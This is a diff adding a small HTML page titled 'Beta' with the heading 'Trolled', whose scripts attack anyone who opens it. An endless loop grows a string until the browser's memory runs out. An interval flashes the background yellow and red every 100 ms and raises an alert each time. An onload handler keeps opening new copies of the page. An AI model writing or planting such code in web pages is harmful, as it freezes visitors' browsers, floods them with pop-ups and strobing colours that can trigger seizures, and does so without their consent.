@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>Beta</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+  <h1>Trolled</h1>
+</body>
+<script>
+var txt = "a";
+while(1){
+    txt += "a";
+}
+</script>
+    <script>
+        activ = window.setInterval("Farbe()", 100);
+        farbe=1;
+        
+        function Farbe() {
+            if(farbe==1) {
+                document.bgColor="FFFF00";
+                farbe=2;
+            }else {
+                document.bgColor="FF0000";
+                farbe=1;
+            }
+            
+            alert("Silly ");
+        }
+
+        function erneut(){
+            window.open(self.location,'');
+        }
+        
+        window.onload = erneut;
+    </script>
+</html>
